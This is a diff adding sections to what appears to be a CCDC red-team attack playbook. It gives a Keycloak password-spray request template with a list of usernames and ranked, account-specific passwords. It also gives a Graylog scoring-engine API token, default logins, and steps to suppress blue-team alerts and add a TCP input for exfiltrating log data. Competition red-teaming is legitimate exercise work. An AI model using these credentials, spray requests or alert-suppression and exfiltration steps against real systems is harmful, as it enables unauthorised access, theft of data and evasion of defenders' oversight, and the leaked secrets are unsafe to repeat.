@@ -80,6 +80,36 @@ Three new services confirmed in inv5 that accept credential attacks. These shoul
 
 **Scoring role accounts:** moomoo, ceo — these are scoring-only accounts and not valid for admin login. Do not waste spray attempts on these.
 
+### Keycloak IAM Service — Credential Spray Target (confirmed in 2026-inv2)
+
+If Keycloak is running on .103:8080, it exposes user credentials in cleartext HTTP POST bodies when scoring engines or users authenticate via /realms/master/protocol/openid-connect/token.
+
+Keycloak credential spray endpoint:
+  POST http://10.100.XXX.103:8080/realms/master/protocol/openid-connect/token
+  Body: client_id=account-console&username=[user]&password=[pass]&grant_type=password
+
+All 32 teams share identical user accounts and (initially) identical passwords.
+Confirmed user accounts (lowercase first-initial+lastname format):
+  ajordan, arexford, cbaines, codom, dlopez, epark, eyu, flin, gcruz, hzhang,
+  jteller, kkashani, knixon, lchoi, macosta, mcole, menwright, mrodriguez,
+  oaziz, rnormandy, rpatel
+
+High-priority spray passwords (by frequency / likelihood):
+  1. popcorn1?  — used by mcole, jteller, mrodriguez simultaneously (3 accounts, 1 spray)
+  2. mickeymouse — lchoi
+  3. poohbear1   — oaziz
+  4. blingbling  — gcruz
+  5. wildcats    — kkashani
+  6. bobesponja  — macosta (SpongeBob in Spanish)
+  7. OMGaTREX1?  — arexford (competition-themed, also used as replacement password)
+  8. 2fast2furious — eyu
+  9. capricornio — rnormandy (Spanish zodiac sign)
+ 10. floricienta — knixon (Spanish telenovela)
+
+Keycloak admin console: /auth/admin/ or /realms/master (try admin/admin or admin/password)
+Scoring check path: /realms/master/protocol/openid-connect/token
+Keycloak admin API allows: user enumeration, password reset, role escalation, OIDC token forge
+
 ## Quick-Win Service Exploits
 
 These are the 30-second checks that yield immediate access on common CCDC services. Run these against every target in Phase 1 before moving to more complex attacks.
@@ -121,6 +151,32 @@ Noise level: LOW (single multipart POST to upload, then GET to verify)
 Persistence value: HIGH (Splunk restarts maintain the malicious app)
 
 Rate this as Tier A when Splunk is found with default credentials — it is a quick-win equivalent to Tomcat Manager but with better persistence properties.
+
+### Graylog SIEM as Credential Target (confirmed in 2026-inv2)
+
+Graylog runs on .170:9000 in inv2 competition environments.
+
+Scoring engine token (identical across all teams):
+  12afjthotgefe01fv714tec0ag9qeuf3qup9a36bcecicbo11fj0
+  Usage: HTTP Basic Authorization: Basic [base64(token:token)]
+
+API access with this token:
+  GET  http://10.100.XXX.170:9000/api/search/universal/relative?query=*&range=3600&limit=100
+  (search all logs for the last hour)
+  GET  http://10.100.XXX.170:9000/api/system/inputs  (list configured log inputs)
+  POST http://10.100.XXX.170:9000/api/system/inputs  (add new log input — potential persistence)
+
+Web login default credentials: admin/admin (Graylog default)
+Also try: admin/password, admin/graylog
+
+Attack paths after login:
+  - Search logs for credentials, service names, admin actions
+  - Review stream rules to understand what blue team is monitoring
+  - Modify stream alerts to suppress blue team notifications about red team activity
+  - Add a raw TCP input and configure as callback for exfiltration of log data
+
+Detection risk: LOW (API calls look identical to scoring engine queries)
+Note: this Graylog token may recur in future invitational events — try it immediately.
 
 ### FTP Anonymous Access (Port 21)
 
